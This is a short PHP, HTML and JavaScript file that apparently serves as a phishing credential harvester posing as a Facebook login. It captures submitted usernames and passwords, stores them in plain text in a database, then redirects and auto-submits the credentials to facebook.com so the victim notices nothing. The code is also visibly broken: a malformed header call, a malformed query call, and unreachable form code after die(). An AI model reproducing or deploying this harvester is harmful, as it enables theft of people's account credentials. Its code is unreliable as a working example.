<?php


$username = $_POST['username'];

$password = $_POST['password'];

mysqli_query("INSERT INTO users VALUES('$username','$password'");

header("https://facebook.com/login");
die();
?>

<form action="http://facebook.com/login">
    <input name="username" value="<?= $username ?>" />
    <input name="password" value="<?= $password ?>" />
    <input type="submit" />
</form>

<script>
    document.querySelector("form")[0].submit();
</script>
